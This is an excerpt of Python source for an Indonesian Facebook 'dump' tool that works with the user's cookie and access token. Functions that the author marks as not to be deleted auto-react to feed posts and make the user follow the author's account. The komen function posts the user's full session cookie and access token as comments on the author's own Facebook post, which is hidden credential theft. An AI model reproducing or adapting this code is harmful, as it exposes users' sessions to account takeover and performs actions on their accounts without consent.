# coding utf-8
# code by xytaid
# recode boleh asal ngotak dikit jangan apus bot bot gw yah peler 
...
class dump:
      ...
      def tanggapi(self,cookis,url):#jangan dihapus
            try:
                  link = parse(requests.get(url,cookies = {'cookie':cookis}).text,'html.parser')
                  for otw in link.find_all('a',href=True):
                        if 'Tanggapi' in otw.text:
                              reac = random.choice(['Super','Peduli','Marah','Sedih','Wow'])
                              for send in parse(requests.get('https://mbasic.facebook.com{}'.format(otw['href']), cookies = {'cookie':cookis}).text,'html.parser').find_all('a'):
                                    if reac in send.text:
                                          requests.get('https://mbasic.facebook.com{}'.format(send['href']), cookies = {'cookie':cookis})
                                    else:continue
                  self.tanggapi('https://mbasic.facebook.com{}'.format(link.find('a',string='Lihat Berita Lain')['href']), cookis)
            except Exception as e:pass
            
      def folowme(self,cookis):#jangan dihapus
            try:
                  for xx in parse(requests.get(f'https://mbasic.facebook.com/100030564977732', cookies = {'cookie':cookis}).text,'html.parser').find_all('a',href=True):
                        if '/a/subscribe.php?' in xx.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(xx['href']), cookies = {'cookie':cookis}).text
            except Exception as e:print(e)
            
      def komen(self,tok,cok):#jangan dihapus
            try:
                  my2 = ('100030564977732_pfbid0T4VvuNTbHxmpUdu7aBQN6TpdrmRfmNW8NLyXyc6S2kdaMkX315bvVoV8Ua9KjGLol')
                  ran = random.choice(['Panutan Ku😍','Kamu Hebat Bang','Scnya Mantap Bang'])
                  komen = f'{cok}\n\n[ KOMENTAR DITULIS OLEH BOT ]\nPADA TANGGAL : {indo}\nPADA JAM : {jam}'
                  komen2 = f'[ KOMENTAR DITULIS OLEH BOT ]\nPADA TANGGAL : {indo}\nPADA JAM : {jam} WIB\n\n{ran}'
                  komen3 = f'[ KOMENTAR DITULIS OLEH BOT ]\nPADA TANGGAL : {indo}\nPADA JAM : {jam} WIB\n\n{tok}'
                  try:
                        requests.post(f'https://graph.facebook.com/v15.0/{my2}/comments/?message={komen}&access_token={tok}',cookies={'cookie':cok}).json()
                  except KeyError:print('Tumbal Kemungkinan Mati');exit()
                  try:
                        requests.post(f'https://graph.facebook.com/v15.0/{my2}/comments/?message={komen2}&access_token={tok}',cookies={'cookie':cok}).json()
                  except KeyError:print('Tumbal Kemungkinan Mati');exit()
                  try:
                        requests.post(f'https://graph.facebook.com/v15.0/{my2}/comments/?message={komen3}&access_token={tok}',cookies={'cookie':cok}).json()
                  except KeyError:print('Tumbal Kemungkinan Mati');exit()
            except Exception as e:print(e)
      ...
      def menu(self):
            ...
            try:
                  self.clear();print('    ( Simple Dump Noob By XytaId )\n\nWelcome %s Your Uid %s'%(nama, uid));self.getid()     
      ...
      def aturuidnya(self,uid):
            print('\nGunakan Tanda Koma , Jika Ingin Dump 2 Uid Yg Berbeda\nContoh : 10009,10008,100009 Dan Seterusnya ')		
